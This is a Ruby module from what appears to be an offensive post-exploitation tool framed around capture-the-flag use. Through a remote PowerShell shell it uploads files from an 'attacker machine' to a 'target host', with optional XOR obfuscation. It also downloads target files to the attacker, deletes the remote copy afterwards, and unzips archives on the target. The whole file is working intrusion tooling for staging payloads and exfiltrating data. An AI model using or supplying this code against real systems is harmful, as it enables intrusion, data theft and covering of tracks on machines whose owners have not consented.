# lib/evil_ctf/uploader.rb

require 'base64'
require 'fileutils'

module EvilCTF::Uploader
  # ------------------------------------------------------------------
  # Debug flag – set via environment variable EVC_DEBUG=true
  # ------------------------------------------------------------------
  DEBUG = ENV['EVC_DEBUG'] == 'true'

  def self.log_debug(msg)
    puts "[DEBUG] #{msg}" if DEBUG
  end

  # ---------------------------------------------
  # Upload a local file to the remote target (chunked)
  # ---------------------------------------------
  def self.upload_file(local_path, remote_path, shell, encrypt: false, chunk_size: 40000)
    return false unless File.exist?(local_path)

    content = File.binread(local_path)
    content = xor_crypt(content) if encrypt
    base64_content = Base64.strict_encode64(content)

    # Escape Windows path for PowerShell (double backslashes)
    escaped_remote_path = remote_path.gsub('\\', '\\\\')

    log_debug("Preparing upload: #{local_path} -> #{escaped_remote_path}")

    # Small file – single shot
    if base64_content.length <= chunk_size
      ps_single = <<~PS
        try {
          $bytes = [Convert]::FromBase64String('#{base64_content}')
          [IO.File]::WriteAllBytes('#{escaped_remote_path}', $bytes)
          "SUCCESS"
        } catch {
          "ERROR: $($_.Exception.Message)"
        }
      PS

      log_debug("Single-shot PowerShell script:\n#{ps_single}")
      result = shell.run(ps_single)
      log_debug("Result output:\n#{result.output}")
      return false unless result.output.include?('SUCCESS')
    else
      # Chunked upload
      ps_init = <<~PS
        try {
          New-Item -Path '#{escaped_remote_path}' -ItemType File -Force | Out-Null
          "INIT"
        } catch {
          "ERROR: $($_.Exception.Message)"
        }
      PS

      log_debug("Chunk init script:\n#{ps_init}")
      init = shell.run(ps_init)
      log_debug("Init output:\n#{init.output}")
      return false unless init.output.include?('INIT')

      chunks = base64_content.scan(/.{1,#{chunk_size}}/)
      chunks.each_with_index do |chunk, idx|
        # Escape single quotes in the chunk to avoid PowerShell syntax errors
        escaped_chunk = chunk.gsub("'", "\\'")
        ps_chunk = <<~PS
          try {
            $existing = [IO.File]::ReadAllBytes('#{escaped_remote_path}')
            $newbytes = [Convert]::FromBase64String('#{escaped_chunk}')
            $combined = $existing + $newbytes
            [IO.File]::WriteAllBytes('#{escaped_remote_path}', $combined)
            "CHUNK #{idx}"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS

        log_debug("Chunk #{idx} script:\n#{ps_chunk}")
        result = shell.run(ps_chunk)
        log_debug("Chunk #{idx} output:\n#{result.output}")
        return false unless result.output.include?("CHUNK #{idx}")
      end
    end

    # Final verification
    verify = shell.run("if (Test-Path '#{escaped_remote_path}') { 'EXISTS' } else { 'MISSING' }")
    log_debug("Verification output:\n#{verify.output}")
    verify.output.include?('EXISTS')
  rescue => e
    puts "[!] Upload failed: #{e.message}"
    false
  end

  # ---------------------------------------------
  # Download a remote file to the local machine
  # ---------------------------------------------
  def self.download_file(remote_path, local_path, shell)
    exist = shell.run("Test-Path '#{remote_path}'")
    log_debug("Exist check output:\n#{exist.output}")
    return false unless exist.output.strip == 'True'

    result = shell.run("[Convert]::ToBase64String([IO.File]::ReadAllBytes('#{remote_path}'))")
    log_debug("Download script output:\n#{result.output}")
    return false if result.output.strip.empty?

    clean_output = result.output.strip
    clean_output = clean_output.split("\n").last.strip if clean_output.include?("\n")

    unless clean_output =~ /^[A-Za-z0-9+\/=]+$/
      puts "[!] Invalid base64 data received for #{remote_path}"
      puts "[!] Output preview: #{clean_output[0..100]}..."
      return false
    end

    data = Base64.strict_decode64(clean_output)
    FileUtils.mkdir_p(File.dirname(local_path))
    File.binwrite(local_path, data)

    puts "[+] Downloaded #{remote_path} -> #{local_path}"
    shell.run("Remove-Item '#{remote_path}' -Force -ErrorAction SilentlyContinue")
    true
  rescue => e
    puts "[!] Download failed: #{e.message}"
    false
  end

  # ---------------------------------------------
  # File operations menu (upload/download/ZIP)
  # ---------------------------------------------
  def self.file_operations_menu(shell)
    loop do
      puts "\nFile Operations Menu:"
      puts "1. Upload file"
      puts "2. Download file"
      puts "3. Unzip remote file"
      puts "4. Exit menu"
      print "Choice: "
      
      choice = Readline.readline.strip rescue nil
      
      break if choice.nil? || choice == '4'

      case choice
      when '1'
        puts "\n--- Upload File ---"
        print "Source file path (attacker machine): "
        local = Readline.readline.strip rescue nil
        print "Destination file path (target host): "
        remote = Readline.readline.strip rescue nil
        if local && remote
          log_debug("Upload menu: #{local} -> #{remote}")
          unless File.exist?(local)
            puts "[-] Source file does not exist: #{local}"
            next
          end

          dir_path = File.dirname(remote).gsub('\\', '\\\\')
          unless dir_path.empty?
            mkdir_cmd = "New-Item -Path '#{dir_path}' -ItemType Directory -Force -ErrorAction SilentlyContinue"
            log_debug("Creating directory: #{mkdir_cmd}")
            shell.run(mkdir_cmd)
          end

          if self.upload_file(local, remote, shell)
            puts "[+] File uploaded successfully"
          else
            puts "[-] Upload failed"
          end
        else
          puts "[!] Both paths are required for upload"
        end
      when '2'
        puts "\n--- Download File ---"
        print "Source file path (target host): "
        remote = Readline.readline.strip rescue nil
        print "Destination file path (attacker machine): "
        local = Readline.readline.strip rescue nil
        if remote && local
          log_debug("Download menu: #{remote} -> #{local}")
          exist = shell.run("Test-Path '#{remote}'")
          log_debug("Exist check output:\n#{exist.output}")
          unless exist.output.strip == 'True'
            puts "[-] Source file does not exist on target: #{remote}"
            next
          end

          if self.download_file(remote, local, shell)
            puts "[+] File downloaded successfully"
          else
            puts "[-] Download failed"
          end
        else
          puts "[!] Both paths are required for download"
        end
      when '3'
        zip_path = Readline.readline.strip rescue nil
        extract_to = Readline.readline.strip rescue ""
        remote_unzip(shell, zip_path, extract_to.empty? ? nil : extract_to)
      else
        puts "[!] Invalid choice"
      end
    end
  rescue => e
    puts "[!] File operations error: #{e.message}"
  end

  # ---------------------------------------------
  # Unzip a remote ZIP file
  # ---------------------------------------------
  def self.remote_unzip(shell, remote_zip_path, extract_to = nil)
    extract_to ||= File.dirname(remote_zip_path)

    ps = <<~PS
      try {
        $zipPath = "#{remote_zip_path}"
        $extractPath = "#{extract_to}"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
        Get-ChildItem $extractPath -Recurse | Select-Object FullName, Length
      } catch {
        Write-Output "ERROR: $($_.Exception.Message)"
      }
    PS

    result = shell.run(ps)

    if result.output.include?('ERROR:')
      puts result.output
      false
    else
      puts result.output
      true
    end
  rescue => e
    puts "[!] Remote unzip failed: #{e.message}"
    false
  end

  # ---------------------------------------------
  # XOR encryption helper (optional)
  # ---------------------------------------------
  def self.xor_crypt(data, key = 0x42)
    data.bytes.map { |b| (b ^ key).chr }.join
  rescue => e
    puts "[!] XOR crypt failed: #{e.message}"
    data
  end
end

